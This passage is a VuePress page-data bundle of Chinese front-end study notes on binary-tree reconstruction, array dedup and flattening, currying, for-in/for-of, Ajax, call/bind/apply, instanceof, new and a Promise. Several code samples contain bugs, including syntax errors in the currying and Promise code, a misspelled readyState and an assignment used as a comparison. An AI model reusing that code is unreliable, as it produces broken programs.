offer 07",charIndex:9},{level:3,title:"LeetCode 889",slug:"leetcode-889",normalizedTitle:"leetcode 889",charIndex:1240}],headersStr:"题目 剑指 Offer 07 LeetCode 889",content:"# 题目\n\n\n# 剑指 Offer 07\n\n * LeetCode输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。\n\n假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n\n# 思路\n\n * 1、前序遍历找到根结点root\n * 2、找到root在中序遍历的位置 -> 左子树的长度和右子树的长度\n * 3、截取左子树的中序遍历、右子树的中序遍历\n * 4、截取左子树的前序遍历、右子树的前序遍历\n * 5、递归重建二叉树\n\n# 代码\n\n递归\n\nfunction TreeNode(val) {\n      this.val = val;\n      this.left = this.right = null;\n  }\n  const preorder = [3,9,20,15,7] //前序 节点是1\n  const inorder = [9,3,15,20,7] //中序\n  var reConstructBinaryTree = (preorder, inorder)=> {\n        if(preorder.length === 0){\n            return null;\n        }\n        if(preorder.length === 1){\n            return new TreeNode(preorder[0]);\n        }\n        // 找到根节点\n        let rootVal = preorder[0]\n        //跟节点在中序遍历中的索引\n        let index = inorder.indexOf(rootVal)\n       //先序左子树\n        let preLeft = preorder.slice(1,index+1)\n        //先序右子树\n        let preRight = preorder.slice(index+1)\n        //中序左子树\n        let inLeft = inorder.slice(0,index)\n        //中序右子树\n        let inRight = inorder.slice(index+1)\n        // 构建二叉树\n        const node  = new TreeNode(rootVal)\n        node.left = reConstructBinaryTree(preLeft,inLeft)\n        node.right = reConstructBinaryTree(preRight,inRight)\n        return node\n    }\n    reConstructBinaryTree(preorder, inorder)\n\n\n\n# LeetCode 889\n\n * LeetCode 给定两个整数数组，preorder 和 postorder ，其中 preorder 是一个具有 无重复 值的二叉树的前序遍历，postorder 是同一棵树的后序遍历，重构并返回二叉树。\n\n# 思路\n\n * 1、根据前序遍历找到根结点\n * 2、根据前序根节点后的数值确认左子树根节点\n * 3、通过左子树根节点在后序遍历中的index确认左子树和右子树\n * 4、截取左子树的中序遍历、右子树的中序遍历\n * 5、截取左子树的前序遍历、右子树的前序遍历\n * 6、递归重建二叉树输出中序遍历\n\nfunction TreeNode(val) {\n    this.val = val;\n    this.left = this.right = null;\n  }\n  var preorder = [1, 2, 4, 5, 3, 6, 7]\n  var  postorder = [4, 5, 2, 6, 7, 3, 1];\n  var constructFromPrePost = function (preorder, postorder) {\n    if (preorder.length === 0) {\n      return null;\n    }\n    if (preorder.length === 1) {\n      return new TreeNode(preorder[0]);\n    }\n    //根节点\n    let head = preorder[0];\n    //左子树根节点\n    let preLeftHead = preorder[1];\n    //后序遍历左子树根节点index\n    let index = postorder.indexOf(preLeftHead);\n    //先序、后序\n    let preLeft = preorder.slice(1, index + 2);\n    let preRight = preorder.slice(index + 2);\n    let postLeft = postorder.slice(0, index+1);\n    let postRight = postorder.slice(index+1, postorder.length - 1);\n    // 重建树\n    let root = new TreeNode(head);\n    root.left = constructFromPrePost(preLeft,postLeft)\n    root.right = constructFromPrePost(preRight,postRight)\n    return root\n  };\n  constructFromPrePost(preorder, postorder);\n",normalizedContent:"# 题目\n\n\n# 剑指 offer 07\n\n * leetcode输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。\n\n假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n\n# 思路\n\n * 1、前序遍历找到根结点root\n * 2、找到root在中序遍历的位置 -> 左子树的长度和右子树的长度\n * 3、截取左子树的中序遍历、右子树的中序遍历\n * 4、截取左子树的前序遍历、右子树的前序遍历\n * 5、递归重建二叉树\n\n# 代码\n\n递归\n\nfunction treenode(val) {\n      this.val = val;\n      this.left = this.right = null;\n  }\n  const preorder = [3,9,20,15,7] //前序 节点是1\n  const inorder = [9,3,15,20,7] //中序\n  var reconstructbinarytree = (preorder, inorder)=> {\n        if(preorder.length === 0){\n            return null;\n        }\n        if(preorder.length === 1){\n            return new treenode(preorder[0]);\n        }\n        // 找到根节点\n        let rootval = preorder[0]\n        //跟节点在中序遍历中的索引\n        let index = inorder.indexof(rootval)\n       //先序左子树\n        let preleft = preorder.slice(1,index+1)\n        //先序右子树\n        let preright = preorder.slice(index+1)\n        //中序左子树\n        let inleft = inorder.slice(0,index)\n        //中序右子树\n        let inright = inorder.slice(index+1)\n        // 构建二叉树\n        const node  = new treenode(rootval)\n        node.left = reconstructbinarytree(preleft,inleft)\n        node.right = reconstructbinarytree(preright,inright)\n        return node\n    }\n    reconstructbinarytree(preorder, inorder)\n\n\n\n# leetcode 889\n\n * leetcode 给定两个整数数组，preorder 和 postorder ，其中 preorder 是一个具有 无重复 值的二叉树的前序遍历，postorder 是同一棵树的后序遍历，重构并返回二叉树。\n\n# 思路\n\n * 1、根据前序遍历找到根结点\n * 2、根据前序根节点后的数值确认左子树根节点\n * 3、通过左子树根节点在后序遍历中的index确认左子树和右子树\n * 4、截取左子树的中序遍历、右子树的中序遍历\n * 5、截取左子树的前序遍历、右子树的前序遍历\n * 6、递归重建二叉树输出中序遍历\n\nfunction treenode(val) {\n    this.val = val;\n    this.left = this.right = null;\n  }\n  var preorder = [1, 2, 4, 5, 3, 6, 7]\n  var  postorder = [4, 5, 2, 6, 7, 3, 1];\n  var constructfromprepost = function (preorder, postorder) {\n    if (preorder.length === 0) {\n      return null;\n    }\n    if (preorder.length === 1) {\n      return new treenode(preorder[0]);\n    }\n    //根节点\n    let head = preorder[0];\n    //左子树根节点\n    let prelefthead = preorder[1];\n    //后序遍历左子树根节点index\n    let index = postorder.indexof(prelefthead);\n    //先序、后序\n    let preleft = preorder.slice(1, index + 2);\n    let preright = preorder.slice(index + 2);\n    let postleft = postorder.slice(0, index+1);\n    let postright = postorder.slice(index+1, postorder.length - 1);\n    // 重建树\n    let root = new treenode(head);\n    root.left = constructfromprepost(preleft,postleft)\n    root.right = constructfromprepost(preright,postright)\n    return root\n  };\n  constructfromprepost(preorder, postorder);\n",charsets:{cjk:!0}},{title:"Array去重扁平化",frontmatter:{title:"Array去重扁平化"},regularPath:"/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html",relativePath:"javascript/Array去重扁平化.md",key:"v-71b21db6",path:"/javascript/Array%E5%8E%BB%E9%87%8D%E6%89%81%E5%B9%B3%E5%8C%96.html",headers:[{level:3,title:"数组去重",slug:"数组去重",normalizedTitle:"数组去重",charIndex:2},{level:3,title:"数组扁平化(Array flatten)",slug:"数组扁平化-array-flatten",normalizedTitle:"数组扁平化(array flatten)",charIndex:525}],headersStr:"数组去重 数组扁平化(Array flatten)",content:'# 数组去重\n\n# reduce(数组对象去重)\n\nlet array = [\n  { id: 1, name: "a" },\n  { id: 2, name: "b" },\n  { id: 3, name: "c" },\n  { id: 5, name: "d" },\n  { id: 1, name: "e" },\n];\nfunction unique(arr, key) {\n  let obj = {};\n  return arr.reduce((accumulator, currentValue, currentIndex) => {\n    //当前key键的value值存在于obj函数中时,说明重复\n    if (!obj[currentValue[key]]) {\n      obj[currentValue[key]] = true;\n      accumulator.push(currentValue);\n    }\n    return accumulator;\n  }, []);\n}\nconsole.log("unique(array,id) :>> ", unique(array, "id"));\n\n\n\n# 数组扁平化(Array flatten)\n\n# 递归+reduce\n\nexport function flattenByReduce(arr:any[]=[]):any[] {\n  let res:any = []\n  arr.reduce((acc,cur,index)=>{\n    res = acc.concat(Array.isArray(cur)?flattenByReduce(cur):cur)\n  },[])\n  return res\n}\nconsole.log(\'flatten() :>> \', flattenByConcat([1,2,[3],[4,[5,[6]]]]));\n\n\n# 递归 +concat\n\n/**\n * concat\n */\n\nexport function flattenByConcat(arr: any[]): any[] {\n  let res: any = [];\n  arr.forEach((item) => {\n    if (Array.isArray(item)) {\n      res = res.concat(flattenByConcat(item));\n    } else {\n      res = res.concat(item);\n    }\n  });\n  return res;\n}\nconsole.log("flatten() :>> ", flattenByConcat([1, 2, [3], [4, [5, [6]]]]));\n',normalizedContent:'# 数组去重\n\n# reduce(数组对象去重)\n\nlet array = [\n  { id: 1, name: "a" },\n  { id: 2, name: "b" },\n  { id: 3, name: "c" },\n  { id: 5, name: "d" },\n  { id: 1, name: "e" },\n];\nfunction unique(arr, key) {\n  let obj = {};\n  return arr.reduce((accumulator, currentvalue, currentindex) => {\n    //当前key键的value值存在于obj函数中时,说明重复\n    if (!obj[currentvalue[key]]) {\n      obj[currentvalue[key]] = true;\n      accumulator.push(currentvalue);\n    }\n    return accumulator;\n  }, []);\n}\nconsole.log("unique(array,id) :>> ", unique(array, "id"));\n\n\n\n# 数组扁平化(array flatten)\n\n# 递归+reduce\n\nexport function flattenbyreduce(arr:any[]=[]):any[] {\n  let res:any = []\n  arr.reduce((acc,cur,index)=>{\n    res = acc.concat(array.isarray(cur)?flattenbyreduce(cur):cur)\n  },[])\n  return res\n}\nconsole.log(\'flatten() :>> \', flattenbyconcat([1,2,[3],[4,[5,[6]]]]));\n\n\n# 递归 +concat\n\n/**\n * concat\n */\n\nexport function flattenbyconcat(arr: any[]): any[] {\n  let res: any = [];\n  arr.foreach((item) => {\n    if (array.isarray(item)) {\n      res = res.concat(flattenbyconcat(item));\n    } else {\n      res = res.concat(item);\n    }\n  });\n  return res;\n}\nconsole.log("flatten() :>> ", flattenbyconcat([1, 2, [3], [4, [5, [6]]]]));\n',charsets:{cjk:!0}},{title:"Javascript",frontmatter:{title:"Javascript"},regularPath:"/javascript/",relativePath:"javascript/README.md",key:"v-488f3082",path:"/javascript/",headers:[{level:2,title:"Javascript",slug:"javascript",normalizedTitle:"javascript",charIndex:2}],headersStr:"Javascript",content:"# Javascript\n\n * 深拷贝\n * 手写instanceof\n * 手写手写call,bind,apply\n * 手写new操作符\n * 节流和防抖\n * 手写promise\n * 单例模式\n * 柯里化函数\n * Array去重扁平化\n * 手写Ajax,\n * add(1)(2)(3)\n * for in和for of\n * 手写getType",normalizedContent:"# javascript\n\n * 深拷贝\n * 手写instanceof\n * 手写手写call,bind,apply\n * 手写new操作符\n * 节流和防抖\n * 手写promise\n * 单例模式\n * 柯里化函数\n * array去重扁平化\n * 手写ajax,\n * add(1)(2)(3)\n * for in和for of\n * 手写gettype",charsets:{cjk:!0}},{title:"add(1)(2)(3)",frontmatter:{title:"add(1)(2)(3)"},regularPath:"/javascript/add(1)(2)(3).html",relativePath:"javascript/add(1)(2)(3).md",key:"v-e8b96868",path:"/javascript/add(1)(2)(3).html",headers:[{level:3,title:"单纯的实现",slug:"单纯的实现",normalizedTitle:"单纯的实现",charIndex:2},{level:3,title:"闭包暴力实现",slug:"闭包暴力实现",normalizedTitle:"闭包暴力实现",charIndex:93},{level:3,title:"Currying",slug:"currying",normalizedTitle:"currying",charIndex:336}],headersStr:"单纯的实现 闭包暴力实现 Currying",content:"# 单纯的实现\n\n  const add = x=>y=>z=>x+y+z\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n\n# 闭包暴力实现\n\n  function add(x){\n    return function(y){\n      return function(z){\n        return x+y+z\n      }\n    }\n  }\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n以上只是单纯的实现add(1)(2)(3) 如果一个函数实现add(1, 2, 3);add(1, 2)(3);add(1)(2, 3)呢？\n\n\n# Currying\n\nfunction currying(fn){\n  return function curry(...args){\n    if(fn.length!==args.length){\n      return curry.bind(null,..args)\n    }\n    return fn(...args)\n  }\n}\nconst totalNum = (x,y,z)=>x+y+z\nconst curryTotal = currying(totalNum)\nconsole.log(curryTotal(1)(2)(3))\n\n\nconst curry = (fn, ...args) => \n    // 函数的参数个数可以直接通过函数数的.length属性来访问\n    args.length >= fn.length // 这个判断很关键！！！\n    // 传入的参数大于等于原始函数fn的参数个数，则直接执行该函数\n    ? fn(...args)\n    /**\n     * 传入的参数小于原始函数fn的参数个数时\n     * 则继续对当前函数进行柯里化，返回一个接受所有参数（当前参数和剩余参数） 的函数\n    */\n    : (..._args) => curry(fn, ...args, ..._args);\n\nfunction add1(x, y, z) {\n    return x + y + z;\n}\nconst add = curry(add1);\nconsole.log(add(1, 2, 3));\nconsole.log(add(1)(2)(3));\nconsole.log(add(1, 2)(3));\nconsole.log(add(1)(2, 3));\n",normalizedContent:"# 单纯的实现\n\n  const add = x=>y=>z=>x+y+z\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n\n# 闭包暴力实现\n\n  function add(x){\n    return function(y){\n      return function(z){\n        return x+y+z\n      }\n    }\n  }\n  console.log('add(1)(2)(3) :>> ', add(1)(2)(3));\n\n\n以上只是单纯的实现add(1)(2)(3) 如果一个函数实现add(1, 2, 3);add(1, 2)(3);add(1)(2, 3)呢？\n\n\n# currying\n\nfunction currying(fn){\n  return function curry(...args){\n    if(fn.length!==args.length){\n      return curry.bind(null,..args)\n    }\n    return fn(...args)\n  }\n}\nconst totalnum = (x,y,z)=>x+y+z\nconst currytotal = currying(totalnum)\nconsole.log(currytotal(1)(2)(3))\n\n\nconst curry = (fn, ...args) => \n    // 函数的参数个数可以直接通过函数数的.length属性来访问\n    args.length >= fn.length // 这个判断很关键！！！\n    // 传入的参数大于等于原始函数fn的参数个数，则直接执行该函数\n    ? fn(...args)\n    /**\n     * 传入的参数小于原始函数fn的参数个数时\n     * 则继续对当前函数进行柯里化，返回一个接受所有参数（当前参数和剩余参数） 的函数\n    */\n    : (..._args) => curry(fn, ...args, ..._args);\n\nfunction add1(x, y, z) {\n    return x + y + z;\n}\nconst add = curry(add1);\nconsole.log(add(1, 2, 3));\nconsole.log(add(1)(2)(3));\nconsole.log(add(1, 2)(3));\nconsole.log(add(1)(2, 3));\n",charsets:{cjk:!0}},{title:"for in和for of",frontmatter:{title:"for in和for of"},regularPath:"/javascript/for%20in%E5%92%8Cfor%20of.html",relativePath:"javascript/for in和for of.md",key:"v-60a40125",path:"/javascript/for%20in%E5%92%8Cfor%20of.html",headers:[{level:2,title:"for in和for of",slug:"for-in和for-of",normalizedTitle:"for in和for of",charIndex:2},{level:3,title:"对象根据主键去重",slug:"对象根据主键去重",normalizedTitle:"对象根据主键去重",charIndex:1121}],headersStr:"for in和for of 对象根据主键去重",content:"# for in和for of\n\n * for in可以遍历对象返回key，遍历数组，返回下标index\n * for of可以遍历数组，返回值，不能遍历对象\n\n//遍历对象\n  let obj = {\n    name:'yang',\n    age:18\n  }\n  for(let i in obj){\n    console.log('i :>> ', i); // name  age\n  }\n  for(let i of obj){\n    console.log('i :>> ', i); //obj is not iterable\n  }\n\n  // 遍历数组\n  let arr = [1,2,3,4]\n  for(let item in arr){\n    console.log('item :>> ', item); //0 1 2 3\n  }\n  for(let item of arr){\n    console.log('item :>> ', item); // 1 2 3 4\n  }\n\n\n * for of可以遍历Set,Map\n\n //map\n  let map = new Map([\n    ['name','yang'],\n    ['age',18]\n  ])\n  for(let i of map){\n    console.log('i :>> ', i);\n    //i :>>  ['name', 'yang']\n    //i :>>  ['age', 18]\n  }\n\n  //Set\n  let set = new Set([1,2,3,3,4,4,5])\n  for(let i of set) {\n    console.log('i :>> ', i);\n  }\n\n\n> for in用于可枚举数据，如数组，对象，字符串\n\nlet obj = {'name':'yang'}\nObject.getOwnPropertyDescriptors(obj)\n// {\n//     \"name\": {\n//         \"value\": \"yang\",\n//         \"writable\": true,\n//         \"enumerable\": true, //可枚举属性为true\n//         \"configurable\": true\n//     }\n// }\n\n\n * Object.getOwnPropertyDescriptor()——获取所有属性里面的数据描述符\n\n> for of用于可迭代数据，数组、字符串、Map、Set\n\n\n# 对象根据主键去重\n\n根据对象的主键去重，如果对象a中存在与b对象主键相同的元素，则删除掉，最后输出a\n\nlet obj1 = {\n    '0x123456':'a',\n    '0x123455':'b',\n    '0x195237':'c',\n    '0x145839':'d'\n  }\n  let obj2 = {\n    '0x123456':'adede',\n    '0x123465':'brrg',\n    '0x195247':'cvvfv',\n    '0x123455':'dcsq'\n  }\n \n  function getUniqueObj(a,b){\n    for(let i in a) {\n    for(let e in b){\n      if(i===e){\n        delete a[i]\n      }\n    }\n  }\n  return a\n  }\n  console.log(getUniqueObj(obj1,obj2))\n",normalizedContent:"# for in和for of\n\n * for in可以遍历对象返回key，遍历数组，返回下标index\n * for of可以遍历数组，返回值，不能遍历对象\n\n//遍历对象\n  let obj = {\n    name:'yang',\n    age:18\n  }\n  for(let i in obj){\n    console.log('i :>> ', i); // name  age\n  }\n  for(let i of obj){\n    console.log('i :>> ', i); //obj is not iterable\n  }\n\n  // 遍历数组\n  let arr = [1,2,3,4]\n  for(let item in arr){\n    console.log('item :>> ', item); //0 1 2 3\n  }\n  for(let item of arr){\n    console.log('item :>> ', item); // 1 2 3 4\n  }\n\n\n * for of可以遍历set,map\n\n //map\n  let map = new map([\n    ['name','yang'],\n    ['age',18]\n  ])\n  for(let i of map){\n    console.log('i :>> ', i);\n    //i :>>  ['name', 'yang']\n    //i :>>  ['age', 18]\n  }\n\n  //set\n  let set = new set([1,2,3,3,4,4,5])\n  for(let i of set) {\n    console.log('i :>> ', i);\n  }\n\n\n> for in用于可枚举数据，如数组，对象，字符串\n\nlet obj = {'name':'yang'}\nobject.getownpropertydescriptors(obj)\n// {\n//     \"name\": {\n//         \"value\": \"yang\",\n//         \"writable\": true,\n//         \"enumerable\": true, //可枚举属性为true\n//         \"configurable\": true\n//     }\n// }\n\n\n * object.getownpropertydescriptor()——获取所有属性里面的数据描述符\n\n> for of用于可迭代数据，数组、字符串、map、set\n\n\n# 对象根据主键去重\n\n根据对象的主键去重，如果对象a中存在与b对象主键相同的元素，则删除掉，最后输出a\n\nlet obj1 = {\n    '0x123456':'a',\n    '0x123455':'b',\n    '0x195237':'c',\n    '0x145839':'d'\n  }\n  let obj2 = {\n    '0x123456':'adede',\n    '0x123465':'brrg',\n    '0x195247':'cvvfv',\n    '0x123455':'dcsq'\n  }\n \n  function getuniqueobj(a,b){\n    for(let i in a) {\n    for(let e in b){\n      if(i===e){\n        delete a[i]\n      }\n    }\n  }\n  return a\n  }\n  console.log(getuniqueobj(obj1,obj2))\n",charsets:{cjk:!0}},{title:"手写Ajax",frontmatter:{title:"手写Ajax"},regularPath:"/javascript/%E6%89%8B%E5%86%99Ajax.html",relativePath:"javascript/手写Ajax.md",key:"v-37a6fbbc",path:"/javascript/%E6%89%8B%E5%86%99Ajax.html",headers:[{level:3,title:"手写Ajax",slug:"手写ajax",normalizedTitle:"手写ajax",charIndex:2}],headersStr:"手写Ajax",content:"# 手写Ajax\n\nconst ajax = (method, url, data, success, fail) => {\n  var request = new XMLHttpRequest()\n  request.open(method, url)\n  request.onreadystatechange = function () {\n    if(request.redyState === 4) {\n      if(request.status >= 200 && request.status < 300 || request.status === 304) {\n        success(request)\n      }else {\n          fail(request)\n        }\n    }\n  }\n  request.send()\n}\n",normalizedContent:"# 手写ajax\n\nconst ajax = (method, url, data, success, fail) => {\n  var request = new xmlhttprequest()\n  request.open(method, url)\n  request.onreadystatechange = function () {\n    if(request.redystate === 4) {\n      if(request.status >= 200 && request.status < 300 || request.status === 304) {\n        success(request)\n      }else {\n          fail(request)\n        }\n    }\n  }\n  request.send()\n}\n",charsets:{cjk:!0}},{title:"for和forEach谁更快",frontmatter:{title:"for和forEach谁更快"},regularPath:"/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html",relativePath:"javascript/for和forEach谁更快.md",key:"v-1834bbf3",path:"/javascript/for%E5%92%8CforEach%E8%B0%81%E6%9B%B4%E5%BF%AB.html",headers:[{level:2,title:"为什么？",slug:"为什么",normalizedTitle:"为什么？",charIndex:49},{level:2,title:"如何验证？",slug:"如何验证",normalizedTitle:"如何验证？",charIndex:128}],headersStr:"为什么？ 如何验证？",content:'# for 和 forEach 谁更快\n\n * for 更快，forEach 可读性更好\n\n\n# 为什么？\n\nfor 直接在当前函数中执行，forEach 每次都要新创建一个函数。 函数有单独的作用域和上下文（可回顾“堆栈模型”），所以耗时更久。\n\n\n# 如何验证？\n\nconst arr = [];\nfor (let i = 0; i < 1000 * 10000; i++) {\n  arr.push(i);\n}\nconst length = arr.length;\n\nconsole.time("for");\nlet n1 = 0;\nfor (let i = 0; i < length; i++) {\n  n1++;\n}\nconsole.timeEnd("for"); // for: 11.7373046875 ms\n\nconsole.time("forEach");\nlet n2 = 0;\narr.forEach(() => n2++);\nconsole.timeEnd("forEach"); // forEach: 67.514892578125 ms\n',normalizedContent:'# for 和 foreach 谁更快\n\n * for 更快，foreach 可读性更好\n\n\n# 为什么？\n\nfor 直接在当前函数中执行，foreach 每次都要新创建一个函数。 函数有单独的作用域和上下文（可回顾“堆栈模型”），所以耗时更久。\n\n\n# 如何验证？\n\nconst arr = [];\nfor (let i = 0; i < 1000 * 10000; i++) {\n  arr.push(i);\n}\nconst length = arr.length;\n\nconsole.time("for");\nlet n1 = 0;\nfor (let i = 0; i < length; i++) {\n  n1++;\n}\nconsole.timeend("for"); // for: 11.7373046875 ms\n\nconsole.time("foreach");\nlet n2 = 0;\narr.foreach(() => n2++);\nconsole.timeend("foreach"); // foreach: 67.514892578125 ms\n',charsets:{cjk:!0}},{title:"手写call,bind,apply",frontmatter:{title:"手写call,bind,apply"},regularPath:"/javascript/%E6%89%8B%E5%86%99call,bind,apply.html",relativePath:"javascript/手写call,bind,apply.md",key:"v-3636c130",path:"/javascript/%E6%89%8B%E5%86%99call,bind,apply.html",headers:[{level:2,title:"手写bind",slug:"手写bind",normalizedTitle:"手写bind",charIndex:2},{level:2,title:"手写call",slug:"手写call",normalizedTitle:"手写call",charIndex:420},{level:2,title:"手写apply",slug:"手写apply",normalizedTitle:"手写apply",charIndex:610}],headersStr:"手写bind 手写call 手写apply",content:"# 手写bind\n\n * 调用bind过程中不会执行方法,只会返回一个方法\n\nFunction.prototype.newbind = function(){\n  const args = Array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\n\n\n\n# 手写call\n\nFunction.prototype.myCall= function (context,...args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n\n\n\n# 手写apply\n\nFunction.prototype.myApply = function (context,args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n",normalizedContent:"# 手写bind\n\n * 调用bind过程中不会执行方法,只会返回一个方法\n\nfunction.prototype.newbind = function(){\n  const args = array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\n\n\n\n# 手写call\n\nfunction.prototype.mycall= function (context,...args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n\n\n\n# 手写apply\n\nfunction.prototype.myapply = function (context,args) {\n  context = context || {}\n  context.fn = this\n  const result = context.fn(...args)\n  delete context.fn\n  return result\n}\n",charsets:{cjk:!0}},{title:"手写getType",frontmatter:{"title:'手写getType'":null},regularPath:"/javascript/%E6%89%8B%E5%86%99getType.html",relativePath:"javascript/手写getType.md",key:"v-792a7262",path:"/javascript/%E6%89%8B%E5%86%99getType.html",headersStr:null,content:"# 手写getType\n\n重点是使用Object.prototype.toString.call()\n\n * 获取详细的数据类型\n\n/**\n * 获取详细的数据类型\n * @param val\n */\nfunction getType(val: any): string {\n  //调用原型中的方法\n  const typeProto = Object.prototype.toString.call(val) //[object String]\n  const spaceIndex = typeProto.indexOf(' ')\n  const type = typeProto.slice(spaceIndex + 1, -1)\n  return type.toLowerCase()\n}\nconsole.info(getType(() => { }))\nconsole.log(getType(100))\nconsole.log(getType({}))\n",normalizedContent:"# 手写gettype\n\n重点是使用object.prototype.tostring.call()\n\n * 获取详细的数据类型\n\n/**\n * 获取详细的数据类型\n * @param val\n */\nfunction gettype(val: any): string {\n  //调用原型中的方法\n  const typeproto = object.prototype.tostring.call(val) //[object string]\n  const spaceindex = typeproto.indexof(' ')\n  const type = typeproto.slice(spaceindex + 1, -1)\n  return type.tolowercase()\n}\nconsole.info(gettype(() => { }))\nconsole.log(gettype(100))\nconsole.log(gettype({}))\n",charsets:{cjk:!0}},{title:"手写instanceof",frontmatter:{title:"手写instanceof"},regularPath:"/javascript/%E6%89%8B%E5%86%99instanceof.html",relativePath:"javascript/手写instanceof.md",key:"v-dd1c97bc",path:"/javascript/%E6%89%8B%E5%86%99instanceof.html",headers:[{level:2,title:"手写instanceof",slug:"手写instanceof",normalizedTitle:"手写instanceof",charIndex:2}],headersStr:"手写instanceof",content:"# 手写instanceof\n\n/**\n * @param source\n * @param target class or function\n */\nfunction newInstanceof(source:any,target:any):boolean {\n  //判空和所有的值类型\n  if(!['function','object'].includes(typeof source)|| typeof source ==null) return false\n  let tempSource = source\n  while(tempSource){\n    if(tempSource.__proto__ === target.prototype){\n      return true\n    }\n    //如果找不到\n    //那就继续顺着原型链，往上找\n    tempSource = tempSource.__proto__\n  }\n  return false\n}\nconsole.info( newInstanceof({}, Object) )\nconsole.info( newInstanceof([], Object) )\nconsole.info( newInstanceof([], Array) )\nconsole.info( newInstanceof({}, Array) )\n",normalizedContent:"# 手写instanceof\n\n/**\n * @param source\n * @param target class or function\n */\nfunction newinstanceof(source:any,target:any):boolean {\n  //判空和所有的值类型\n  if(!['function','object'].includes(typeof source)|| typeof source ==null) return false\n  let tempsource = source\n  while(tempsource){\n    if(tempsource.__proto__ === target.prototype){\n      return true\n    }\n    //如果找不到\n    //那就继续顺着原型链，往上找\n    tempsource = tempsource.__proto__\n  }\n  return false\n}\nconsole.info( newinstanceof({}, object) )\nconsole.info( newinstanceof([], object) )\nconsole.info( newinstanceof([], array) )\nconsole.info( newinstanceof({}, array) )\n",charsets:{cjk:!0}},{title:"手写new",frontmatter:{title:"手写new"},regularPath:"/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html",relativePath:"javascript/手写new操作符.md",key:"v-772bea3a",path:"/javascript/%E6%89%8B%E5%86%99new%E6%93%8D%E4%BD%9C%E7%AC%A6.html",headers:[{level:2,title:"手写new",slug:"手写new",normalizedTitle:"手写new",charIndex:2}],headersStr:"手写new",content:"# 手写new\n\n/**\n * new操作符\n */\n\nexport function New<T>(constructor:Function,...args:any[]):T{\n  // 1. 创建一个空对象，继承 constructor 的原型\n  const obj = Object.create(constructor.prototype)\n  // 2. 将 obj 作为 this ，执行 constructor ，传入参数\n  constructor.apply(obj,args)\n  return obj\n}\n\nclass Foo {\n  name:string\n  age:number\n  constructor(name:string,age:number){\n    this.name = name\n    this.age = age\n  }\n  getInfo() {\n    return this.name+this.age\n  }\n}\nconst a = New<Foo>(Foo,'yang',18)\nconsole.log('a :>> ', a); \nconsole.log('a.getInfo() :>> ', a.getInfo()); //a.getInfo() :>>  yang18\n",normalizedContent:"# 手写new\n\n/**\n * new操作符\n */\n\nexport function new<t>(constructor:function,...args:any[]):t{\n  // 1. 创建一个空对象，继承 constructor 的原型\n  const obj = object.create(constructor.prototype)\n  // 2. 将 obj 作为 this ，执行 constructor ，传入参数\n  constructor.apply(obj,args)\n  return obj\n}\n\nclass foo {\n  name:string\n  age:number\n  constructor(name:string,age:number){\n    this.name = name\n    this.age = age\n  }\n  getinfo() {\n    return this.name+this.age\n  }\n}\nconst a = new<foo>(foo,'yang',18)\nconsole.log('a :>> ', a); \nconsole.log('a.getinfo() :>> ', a.getinfo()); //a.getinfo() :>>  yang18\n",charsets:{cjk:!0}},{frontmatter:{},regularPath:"/guide/",relativePath:"guide/README.md",key:"v-67b513d6",path:"/guide/",headersStr:null,content:"前端\n\n> js,http,vue,css......学废or学废....\n\n----------------------------------------\n\nJavascript\n\n> coding...coding...coding...\n\n----------------------------------------\n\n数据结构\n\n> 暂时只有tree的原因，也是因为自己也才学习了tree，正处在数据结构起步阶段，痛苦中",normalizedContent:"前端\n\n> js,http,vue,css......学废or学废....\n\n----------------------------------------\n\njavascript\n\n> coding...coding...coding...\n\n----------------------------------------\n\n数据结构\n\n> 暂时只有tree的原因，也是因为自己也才学习了tree，正处在数据结构起步阶段，痛苦中",charsets:{cjk:!0}},{title:"手写promise",frontmatter:{title:"手写promise"},regularPath:"/javascript/%E6%89%8B%E5%86%99promise.html",relativePath:"javascript/手写promise.md",key:"v-2e77ec4c",path:"/javascript/%E6%89%8B%E5%86%99promise.html",headers:[{level:3,title:"手写promise",slug:"手写promise",normalizedTitle:"手写promise",charIndex:2}],headersStr:"手写promise",content:"# 手写promise\n\nclass promise {\n  constructor(executor){\n    //初始化pending\n    this.state = 'pending'\n    //success\n    this.value = undefined\n    //失败\n    this.reason = undefined\n    //resolve\n    let resolve = value=>{\n      if(this.state === 'pending'){\n        this.state = 'fulfilled'\n        this.value = value\n      }\n    }\n    //reject\n    let reject = reson=>{\n      if(this.state = 'pending'){\n        this.state = 'rejected'\n        this.reason = reason\n      }\n    }\n    try {\n      executor(resolve,reject)\n    }catch(err)=>{\n      reject(err)\n    }\n  }\n}\n",normalizedContent:"# 手写promise\n\nclass promise {\n  constructor(executor){\n    //初始化pending\n    this.state = 'pending'\n    //success\n    this.value = undefined\n    //失败\n    this.reason = undefined\n    //resolve\n    let resolve = value=>{\n      if(this.state === 'pending'){\n        this.state = 'fulfilled'\n        this.value = value\n      }\n    }\n    //reject\n    let reject = reson=>{\n      if(this.state = 'pending'){\n        this.state = 'rejected'\n        this.reason = reason\n  